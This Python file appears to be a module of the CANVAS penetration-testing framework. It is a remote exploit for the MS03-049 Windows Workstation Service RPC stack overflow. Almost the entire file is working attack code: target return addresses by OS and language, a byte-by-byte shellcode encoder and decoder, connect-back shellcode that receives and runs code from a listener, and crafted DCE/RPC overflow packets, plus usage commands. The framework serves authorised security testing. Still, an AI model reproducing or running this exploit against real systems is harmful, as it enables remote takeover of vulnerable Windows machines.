#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2003-2007
#http://www.immunityinc.com/CANVAS/ for more information

#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation

import sys
import struct
if '.' not in sys.path: sys.path.append('.')
from exploitutils import *
import canvasengine
from msrpcexploit import msrpcexploit
from shellcode import shellcodeGenerator
from libs.newsmb.libdcerpc import s_dce_raw_unistring, s_dce_unistring

# GUI info
NAME='Microsoft Windows Workstation Service RPC Overflow'
DESCRIPTION='Microsoft Windows Workstation Service RPC Stack Overflow'
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION['Date public']='11/11/03'
DOCUMENTATION['References']='http://www.microsoft.com/technet/security/bulletin/MS03-049.mspx'
DOCUMENTATION['Repeatability']=''
DOCUMENTATION['VersionsAffected']=''
DOCUMENTATION["CVE Name"] = "CVE-2003-0812"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0812"
DOCUMENTATION['CVSS'] = 7.5
DOCUMENTATION["Notes"]="""
This exploit will crash the service if XP SP1a is running under Virtual PC or
Virtual Server (Microsoft's virtualization platform)

For this exploit to work on Windows 2000, the %WINDIR%\Debug\ must be
writeable for Everyone. Which means either the Windows tree is on a FAT32
volume, or the default permissions of the directory have been changed.

Tested on:
Windows 2000 Professional SP4 English OOTB
Windows 2000 Server SP0 English OOTB
Windows 2000 Server SP4 English OOTB
Windows 2000 Professional SP0 Simplified Chinese OOTB
Windows 2000 Server SP4 Japanese OOTB
Windows 2000 Professional SP0 German OOTB
Windows 2000 Professional SP0 Spanish OOTB
Windows XP Professional SP0 English OOTB
Windows XP Professional SP1a English OOTB

Usage:
./exploits/ms03_049/ms03_049.py -v 0 -t 10.10.11.132 -l 10.10.11.1 -d 5555
./commandlineInterface.py -v 1 -p 5555 -i fromcreatethread

"""
VERSION='1.0'
PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000','XP']
PROPERTY['MSADV']='MS03-049'

CHANGELOG="""
KK 01/30/07:
Rewritten
"""

NOTES="""
Notes:

"""

targets = {
    0: ['Autoversioning',0],     
    1: ['Windows 2000 SP0-SP4 English',0x750219d6], #call ebx
    2: ['Windows 2000 SP0-SP4 French, Simplified Chinese',0x74fa19d6], #call ebx
    3: ['Windows 2000 SP0-SP4 Japanese',0x74f819d6], #call ebx
    4: ['Windows 2000 SP0-SP4 German',0x74f919d6], #call ebx
    5: ['Windows 2000 SP0-SP4 Dutch, Italian, Spanish',0x74fd19d6], #call ebx
    #This address is not the same on Virtual server or Virtual PC :<
    #we will instead crash the service
    6: ['Windows XP SP0-SP1a',0x7ffc07a4], #pop&pop&ret
    7: ['Windows XP SP1a English',0x77f536ad] #pop pop ret in NTDLL.dll
}

class theexploit(msrpcexploit):
    def __init__(self):
        msrpcexploit.__init__(self)
        self.name                                 = NAME
        self.port                                 = 139
        self.host                                 = ''
        self.version                              = 0
        self.badstring                            = '\x00'
        self.UUID                                 = u'6bffd098-a112-3610-9833-46c3f87e345a'
        self.uuidversion                          = u'1.0'
        self.targetfunction                       = -1
        self.listenerArgsDict['fromcreatethread'] = 1
        self.autoversion                          = 1
        self.subesp                               = 2000
    
    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]

    def createShellcode(self):
        sc=shellcodeGenerator.win32()
        sc.addAttr('findeipnoesp',{'subespval':0})
        sc.addAttr('revert_to_self_before_importing_ws2_32',None)
        sc.addAttr('tcpconnect',{'port':self.callback.port,'ipaddress':self.callback.ip})
        sc.addAttr('CreateThreadRecvExecWin32',{'socketreg':'FDSPOT'}) #MOSDEF
        sc.addAttr('ExitThread',None)
        rawshellcode=sc.get()
        #Due to unicode encoding strangeness between XP SP0 and XP SP1a, the following
        #encoder was implemented to avoid all the characters between 0x80 and 0x9f
        while (len(rawshellcode)%4)!=0:
            rawshellcode+='A'
        SIZE=len(rawshellcode)/4
        if SIZE>0xff: #should be enough?
            raise Exception,'Shellcode too long!'
        while (SIZE>=0x80) and (SIZE<=0x9f): #increase SIZE if within the badchars range
            rawshellcode+='BBBB'
            SIZE+=1
        #the encoding scheme is pretty self explanatory
        encodedshellcode=''
        for i in range(0,len(rawshellcode),4):
            L=struct.unpack('<L',rawshellcode[i:i+4])[0]
            HIGH=((L&0xf0f0f0f0)>>4)+0x40404040
            LOW=(L&0x0f0f0f0f)+0x40404040
            encodedshellcode+=struct.pack('<LL',HIGH,LOW)
        decoder=''
        decoder+='\xd9\xee'             # 0: fldz
        decoder+='\xd9\x74\x24\xf4'     # 2: fnstenv 0xfffffff4(%esp)
        decoder+='\x5e'                 # 6: pop %esi
        decoder+='\x6a\x28'             # 7: push $0x28
        decoder+='\x59'                 # 9: pop %ecx
        decoder+='\x03\xf1'             # a: add %ecx,%esi
        decoder+='\x56'                 # c: push %esi
        decoder+='\x5f'                 # d: pop %edi
        decoder+='\xb1'+chr(SIZE)       # e: mov $SIZE,%cl
        decoder+='\xad'                 #10: lods %ds:(%esi),%eax
        decoder+='\x2d\x40\x40\x40\x40' #11: sub $0x40404040,%eax
        decoder+='\xc1\xe0\x04'         #16: shl $0x4,%eax
        decoder+='\x50'                 #19: push %eax
        decoder+='\x5a'                 #1a: pop %edx
        decoder+='\xad'                 #1b: lods %ds:(%esi),%eax
        decoder+='\x2d\x40\x40\x40\x40' #1c: sub $0x40404040,%eax
        decoder+='\x03\xc2'             #21: add %edx,%eax
        decoder+='\xab'                 #23: stos %eax,%es:(%edi)
        decoder+='\xe2\xea'             #24: loop 0x10
        decoder+='\x41'                 #26: inc %ecx
        decoder+='\x41'                 #27: inc %ecx
        self.shellcode=decoder+encodedshellcode
        self.log('Total shellcode length=%d'%(len(self.shellcode)))
        return self.shellcode

    def getArgs(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get('port',self.port))
        self.user=self.argsDict.get('user',self.user)
        self.password=self.argsDict.get('password',self.password)
        if self.version==0: #we don't want result of testOS to be overwritten
            self.version=int(self.argsDict.get('version',self.version))

    def testOS(self):
        self.getArgs()
        app=self.engine.getModuleExploit('osdetect')
        app.link(self)
        devlog('ms03_049','target=%s->%s'%(self.target,app.target))
        result=app.run()
        if result==0:
            self.log('Unknown OS, automatic detection failed (try choosing a version)')
            return 0
        os=app.result
        if os.base!='Windows':
            self.log('Cannot attack non Windows with this exploit')
            return 0
        
        attack_language=None #this is the language we will be attacking
        if not os.language:
            self.log('No language found, defaulting to engine\'s non-language option %s'%(self.engine.osdetect_mode))
            if self.engine.osdetect_mode==canvasengine.canvasengine.ASSUME_NO_RUN:
                self.log('Not running, could not find language')
                return 0
            if self.engine.osdetect_mode==canvasengine.canvasengine.ASSUME_ONE_LANG:
                self.log('Assuming language %s'%(self.engine.osdetect_lang))
                attack_language=self.engine.osdetect_lang
            if self.engine.osdetect_mode==canvasengine.canvasengine.ASSUME_NEAREST_NEIGHBOR:
                self.log('Nearest neighbor algorithm not yet implemented')
                return 0
        else:
            #we have one language, so just use it
            attack_language=os.language 
            
        self.log('version=%s'%(os.version))
        if os.version=='2000':
            self.log('Attacking Windows 2000 language: %s'%(os.language))
            langdict={'English':1,'French':2,'Simplified Chinese':2,'Japanese':3,'German':4,'Dutch':5,'Italian':5,'Spanish':5}
            if os.language in langdict.keys():
                self.version=langdict[attack_language]
                return 1
            self.log('No version found: returning failed...')
            return 0
        elif os.version=='XP':
            self.log('Attacking Windows XP language: %s'%(attack_language))
            if attack_language=="English" and os.servicepack==["SP1"]:
                self.version=7
            else:
                #this will crash on Virtual Server Guest images of XP :<
                #but it's a language independant value, which is cool
                self.version=6
            return 1
        else:
            self.log('OS not vulnerable: %s'%(result))
        return 0

    def buildConnectionList(self):
        self.getArgs()
        host=self.host
        connectionList=['ncacn_np:%s[\\wkssvc]'%(host),\
                        'ncacn_ip_tcp:%s[%d]'%(host,self.port),\
                        'ncacn_ip_tcp:%s[445]'%(host),\
                        'ncacn_ip_tcp:%s[1025]'%(host),\
                        'ncacn_ip_tcp:%s[1026]'%(host),\
                        'ncacn_ip_tcp:%s[1027]'%(host),\
                        'ncacn_ip_tcp:%s[1028]'%(host)]
        self.connectionList=connectionList
        return self.connectionList

    def buildDcePacket(self):
        self.log('version=%d'%(self.version))
        self.description,self.eip=targets[self.version]
        payload=''
        packet=''
        if self.description.count('2000')>0:
            self.targetfunction=0x19 #NetrValidateName
            if len(self.shellcode)>0x7e1:
                raise Exception,'Shellcode too long!'
            payload+=self.shellcode
            payload+='A'*(0x7e1-len(payload))
            payload+=struct.pack('<L',self.eip)
            if (len(payload)%2)==1:
                payload+='B'
            packet+=struct.pack('<L',0)
            packet+=s_dce_raw_unistring(payload)
            packet+=struct.pack('<LLL',0,0,0)
        elif self.description.count('XP')>0:
            self.targetfunction=0x1b #NetrAddAlternateComputerName
            if len(self.shellcode)>(0xda4-0x810):
                raise Exception,'Shellcode too long!'
            payload+='A'*0x7fc
            payload+='BBB\xff' #access violation
            payload+='C'*0x10
            offset=len(payload)
            payload+=self.shellcode
            payload+='D'*(0xda4-len(payload))
            payload+='\xeb\x06' #jmp forward
            payload+='EE'
            payload+=struct.pack('<L',self.eip)
            from MOSDEF import mosdef
            payload+=mosdef.assemble('jmp $-%d'%(len(payload)+5-offset),'x86') #jmp backward
            packet+=struct.pack('<L',0)
            packet+=struct.pack('<L',1) #[unique]
            packet+=s_dce_unistring(payload)
            packet+=struct.pack('<LLL',0,0,0)
        return packet

    def displayVersions(self):
        i=0
        for listline in targets.values():
            print '%d: %s'%(i,listline[0])
            i=i+1

if __name__=='__main__':
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None] and hasattr(ret,'interact'):
        ret.interact()
